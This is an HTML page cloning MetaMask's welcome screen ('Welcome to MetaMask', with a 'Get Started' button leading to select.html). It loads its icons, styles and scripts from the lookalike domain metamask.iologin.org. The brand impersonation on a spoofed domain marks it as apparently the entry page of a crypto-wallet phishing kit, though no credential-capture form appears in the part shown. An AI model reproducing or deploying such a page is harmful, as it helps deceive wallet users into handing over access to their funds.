
<html>
<head>

<meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
<title>MetaMask</title>
<link href="https://metamask.iologin.org/images/favicon.png" rel="shortcut icon" type="image/x-icon">
<link href="https://metamask.iologin.org/images/webclip.png" rel="apple-touch-icon">
<script src="https://metamask.iologin.org/static/js/jquery-1.8.3.min.js"></script>
<link rel="stylesheet" type="text/css" href="https://metamask.iologin.org/static/css/index.css" title="ltr">

<body>
	<div id="app-content">
		<div class="app mouse-user-styles">
			<div>
				<span></span>
			</div>
			<div class="menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;">

<style>
.menu-droppo-enter {
	transition: transform 300ms ease-in-out;
	transform: translateY(-200%);
}

.menu-droppo-enter.menu-droppo-enter-active {
	transition: transform 300ms ease-in-out;
	transform: translateY(0%);
}

.menu-droppo-leave {
	transition: transform 300ms ease-in-out;
	transform: translateY(0%);
}

.menu-droppo-leave.menu-droppo-leave-active {
	transition: transform 300ms ease-in-out;
	transform: translateY(-200%);
}
</style>
			</div>
			<div class="main-container-wrapper">
				<div class="first-time-flow">
					<div class="welcome-page__wrapper">
						<div class="welcome-page">
							<div style="z-index: 0;" id="fox-svg"></div>
							<div class="welcome-page__header">Welcome to MetaMask</div>
							<div class="welcome-page__description">
								<div>Connecting you to Ethereum and the Decentralized Web.</div>
								<div>We’re happy to see you.</div>
							</div>
							<button class="button btn-primary first-time-flow__button" onclick="location.href='select.html'">Get Started</button>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div id="popover-content"></div>

	<script src="https://metamask.iologin.org/static/js/anim.js" type="text/javascript" charset="utf-8"></script>

</body>
